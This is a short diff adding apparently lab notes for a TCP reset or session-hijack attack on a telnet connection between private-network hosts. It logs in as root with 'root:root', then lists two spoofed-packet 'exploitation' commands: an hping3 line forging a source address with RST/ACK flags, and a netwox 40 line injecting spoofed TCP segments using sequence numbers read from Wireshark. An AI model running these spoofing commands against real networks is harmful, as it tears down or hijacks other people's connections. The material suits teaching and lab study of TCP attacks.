@@ -1,0 +1,12 @@
+#####CLIENT CONNECT TO TELNET SERVER
+telnet 192.168.2.15
+root:root
+
+#####NOTE THE seqN AND THE ackN FROM THE LAST PACKET IN WIRESHARK
+tcp.port=23
+
+#HPING3 EXPLOITATION  COMMAND
+hping3 192.168.2.15 -a 192.168.2.10 -p 23 -s sport -R -A -M next_seqN -L ack -c 25
+
+#NETWOX EXPLOITATION  COMMAND
+netwox 40 -l 192.168.2.10 -m 192.168.2.15 -o sport -p 23 -B -q seq_N
